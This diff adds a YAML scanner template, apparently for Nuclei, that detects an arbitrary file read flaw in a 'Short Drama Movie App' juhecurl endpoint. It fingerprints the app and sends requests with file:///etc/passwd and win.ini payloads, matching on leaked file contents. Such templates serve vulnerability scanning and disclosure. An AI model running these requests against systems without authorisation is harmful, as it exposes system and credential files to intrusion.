@@ -1,0 +1,46 @@
+id: poc-yaml-movie-app-juhecurl-any-fileread
+info:
+  name: Short Drama Movie App juhecurl Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    Vulnerability in the Short Drama Movie App that allows arbitrary file reading through the juhecurl endpoint.
+    This can lead to sensitive information disclosure, including system files.
+
+variables:
+  data:
+    - "file:///etc/passwd"
+    - "file:///c://windows/win.ini"
+
+flow: http(1) && http(2)
+
+http:
+  - id: first-request
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "VwmRIfEYDH.php"
+
+  - id: file-read-request
+    method: POST
+    path:
+      - "{{BaseURL}}/api/ems/juhecurl?url={{data}}"
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        condition: and
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
